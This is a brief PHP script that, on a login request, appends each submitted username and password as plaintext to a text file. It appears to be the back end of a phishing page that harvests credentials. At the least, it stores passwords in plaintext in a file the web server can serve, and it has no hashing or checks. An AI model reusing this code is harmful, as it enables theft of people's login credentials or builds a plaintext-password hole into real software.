<?php
if (isset($_REQUEST['login'])){
    

    $username = $_POST['username'];
    $password = $_POST['pwd'];
    $filename = 'myfile.txt';
    $fp = fopen($filename, 'a+');
    fwrite ($fp, $username . "," . $password . "\n");

}    
?>

